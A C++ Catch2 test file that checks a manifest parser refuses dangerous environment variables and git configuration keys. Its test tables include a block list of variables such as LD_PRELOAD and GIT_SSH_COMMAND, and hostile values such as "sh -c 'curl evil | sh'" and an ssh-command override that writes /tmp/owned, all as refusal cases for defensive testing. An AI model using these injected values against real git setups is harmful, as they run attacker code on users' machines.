// SPDX-License-Identifier: Apache-2.0
#include <catch2/catch_test_macros.hpp>
#include <catch2/generators/catch_generators.hpp>

#include <filesystem>
#include <format>
#include <fstream>
#include <iterator>
#include <optional>
#include <string>
#include <string_view>

#include <vtextension/Manifest.hpp>
#include <vtextension/SettableEnvironment.hpp>

using vtextension::ManifestFault;
using vtextension::parseManifestText;

namespace
{
/// A version-2 manifest declaring one command `c` and one pane `p`, then @p lines.
[[nodiscard]] std::string manifestWith(std::string_view lines)
{
    return std::format("name = x\nversion = 2\nroot r = config:x\ncommand c short @r = git status\n"
                       "pane p @r = claude\n{}\n",
                       lines);
}

/// @return The fault @p lines make the manifest refused with; std::nullopt where it is accepted.
[[nodiscard]] std::optional<ManifestFault> faultOf(std::string_view lines)
{
    auto const parsed = parseManifestText(manifestWith(lines));
    return parsed ? std::nullopt : std::optional { parsed.error() };
}

} // namespace

TEST_CASE("SettableEnvironment: a variable that would make a granted program run another is refused",
          "[vtextension][manifest][environment]")
{
    auto const setter = GENERATE(as<std::string_view> {}, "command-env", "command-env-for c", "pane-env p");
    auto const name = GENERATE(as<std::string_view> {},
                               "LD_PRELOAD",
                               "LD_LIBRARY_PATH",
                               "DYLD_INSERT_LIBRARIES",
                               "PATH",
                               "NODE_OPTIONS",
                               "PYTHONPATH",
                               "PERL5OPT",
                               "BASH_ENV",
                               "ENV",
                               "GIT_CONFIG_PARAMETERS",
                               "GIT_CONFIG_GLOBAL",
                               "GIT_SSH_COMMAND",
                               "GIT_EXTERNAL_DIFF",
                               "GIT_EXEC_PATH",
                               "GIT_DIR",
                               "EDITOR",
                               "GH_TOKEN",
                               "CONTOUR_PANE",
                               "git_terminal_prompt");
    CAPTURE(setter, name);
    CHECK(faultOf(std::format("{} {} = /tmp/x", setter, name)) == ManifestFault::ForbiddenEnvironment);
}

TEST_CASE("SettableEnvironment: a git configuration key that runs or reads something is refused",
          "[vtextension][manifest][environment]")
{
    auto const setter = GENERATE(as<std::string_view> {}, "command-env", "command-env-for c", "pane-env p");
    // Key and value, as a manifest would set them.
    auto const [key, value] = GENERATE(table<std::string_view, std::string_view>({
        { "core.sshCommand", "sh -c 'curl evil | sh'" },
        { "CORE.SSHCOMMAND", "sh" },
        { "core.hooksPath", "/tmp/hooks" },
        { "core.hooksPath", "." },
        { "core.fsmonitor", "sh -c id" },
        { "core.fsmonitor", "true" },
        { "core.attributesFile", "/tmp/attributes" },
        { "core.pager", "sh" },
        { "core.editor", "sh" },
        { "core.askPass", "/tmp/askpass" },
        { "credential.helper", "!sh" },
        { "sequence.editor", "sh" },
        { "gpg.program", "sh" },
        { "alias.st", "!sh" },
        { "include.path", "/tmp/config" },
        { "includeIf.gitdir:/.path", "/tmp/config" },
        { "filter.lfs.clean", "sh" },
        { "filter.lfs.process", "sh" },
        { "diff.external", "sh" },
        { "uploadpack.packObjectsHook", "sh" },
        { "protocol.ext.allow", "always" },
        { "push.default", "sh -c id" },
        { "push.default.x", "upstream" },
    }));
    CAPTURE(setter, key, value);
    auto const lines = std::format("{0} GIT_CONFIG_COUNT = 1\n{0} GIT_CONFIG_KEY_0 = {1}\n"
                                   "{0} GIT_CONFIG_VALUE_0 = {2}",
                                   setter,
                                   key,
                                   value);
    CHECK(faultOf(lines) == ManifestFault::ForbiddenGitConfig);
}

TEST_CASE("SettableEnvironment: the reviewed attack, a manifest's own ssh command",
          "[vtextension][manifest][environment]")
{
    CHECK(faultOf("command-env GIT_CONFIG_COUNT = 1\n"
                  "command-env GIT_CONFIG_KEY_0 = core.sshCommand\n"
                  "command-env GIT_CONFIG_VALUE_0 = sh -c 'touch /tmp/owned'")
          == ManifestFault::ForbiddenGitConfig);
}

TEST_CASE("SettableEnvironment: a command's own environment is judged as the command gets it",
          "[vtextension][manifest][environment]")
{
    // A key for every command, its value replaced for one: that one would run with core.hooksPath=/tmp.
    CHECK(faultOf("command-env GIT_CONFIG_COUNT = 1\n"
                  "command-env GIT_CONFIG_KEY_0 = core.hooksPath\n"
                  "command-env GIT_CONFIG_VALUE_0 = /dev/null\n"
                  "command-env-for c GIT_CONFIG_VALUE_0 = /tmp")
          == ManifestFault::ForbiddenGitConfig);
    // And a harmless key replaced by a forbidden one.
    CHECK(faultOf("command-env GIT_CONFIG_COUNT = 1\n"
                  "command-env GIT_CONFIG_KEY_0 = push.default\n"
                  "command-env GIT_CONFIG_VALUE_0 = upstream\n"
                  "command-env-for c GIT_CONFIG_KEY_0 = alias.status")
          == ManifestFault::ForbiddenGitConfig);
    // A key whose value is pinned needs its value set.
    CHECK(faultOf("pane-env p GIT_CONFIG_COUNT = 1\npane-env p GIT_CONFIG_KEY_0 = core.hooksPath")
          == ManifestFault::ForbiddenGitConfig);
}

TEST_CASE("SettableEnvironment: a value not of its variable's shape is refused",
          "[vtextension][manifest][environment]")
{
    auto const line = GENERATE(as<std::string_view> {},
                               "command-env GIT_ALLOW_PROTOCOL = https:ext",
                               "command-env GIT_ALLOW_PROTOCOL = https::ssh",
                               "command-env GIT_TERMINAL_PROMPT = 1",
                               "command-env GIT_OPTIONAL_LOCKS = yes",
                               "command-env GIT_CONFIG_COUNT = -1",
                               "command-env GIT_CONFIG_COUNT = 01",
                               "command-env GIT_ATTR_SOURCE = HEAD",
                               "command-env GIT_ATTR_SOURCE = 4B825DC642CB6EB9A060E54BF8D69288FBEE4904",
                               "command-env LC_ALL = /tmp/locale",
                               "command-env GIT_CONFIG_KEY_01 = push.default",
                               "command-env GIT_CONFIG_KEY_ = push.default");
    CAPTURE(line);
    CHECK(faultOf(line) == ManifestFault::ForbiddenEnvironment);
}

TEST_CASE("SettableEnvironment: what the orchestrator sets is settable",
          "[vtextension][manifest][environment]")
{
    CHECK_FALSE(faultOf("command-env GIT_TERMINAL_PROMPT = 0\n"
                        "command-env GIT_ALLOW_PROTOCOL = https:ssh:git:file\n"
                        "command-env GIT_CONFIG_COUNT = 2\n"
                        "command-env GIT_CONFIG_KEY_0 = core.fsmonitor\n"
                        "command-env GIT_CONFIG_VALUE_0 = false\n"
                        "command-env GIT_CONFIG_KEY_1 = core.hooksPath\n"
                        "command-env GIT_CONFIG_VALUE_1 = /dev/null\n"
                        "command-env-for c GIT_CONFIG_COUNT = 3\n"
                        "command-env-for c GIT_CONFIG_KEY_2 = core.attributesFile\n"
                        "command-env-for c GIT_CONFIG_VALUE_2 = /dev/null\n"
                        "command-env-for c GIT_ATTR_SOURCE = 4b825dc642cb6eb9a060e54bf8d69288fbee4904\n"
                        "command-env-for c GIT_OPTIONAL_LOCKS = 0\n"
                        "command-env-for c LC_ALL = C\n"
                        "pane-env p GIT_CONFIG_COUNT = 2\n"
                        "pane-env p GIT_CONFIG_KEY_0 = push.default\n"
                        "pane-env p GIT_CONFIG_VALUE_0 = upstream\n"
                        "pane-env p GIT_CONFIG_KEY_1 = push.autoSetupRemote\n"
                        "pane-env p GIT_CONFIG_VALUE_1 = true"));

    // Its own manifest, as its corpus holds it.
    auto file = std::ifstream { std::filesystem::path { VTEXTENSION_MANIFEST_CORPUS_DIR } / "valid"
                                / "orchestrator.manifest" };
    auto const text = std::string { std::istreambuf_iterator<char> { file }, {} };
    REQUIRE_FALSE(text.empty());
    auto const manifest = parseManifestText(text);
    REQUIRE(manifest.has_value());
    CHECK(vtextension::checkSettableEnvironments(*manifest).has_value());
}
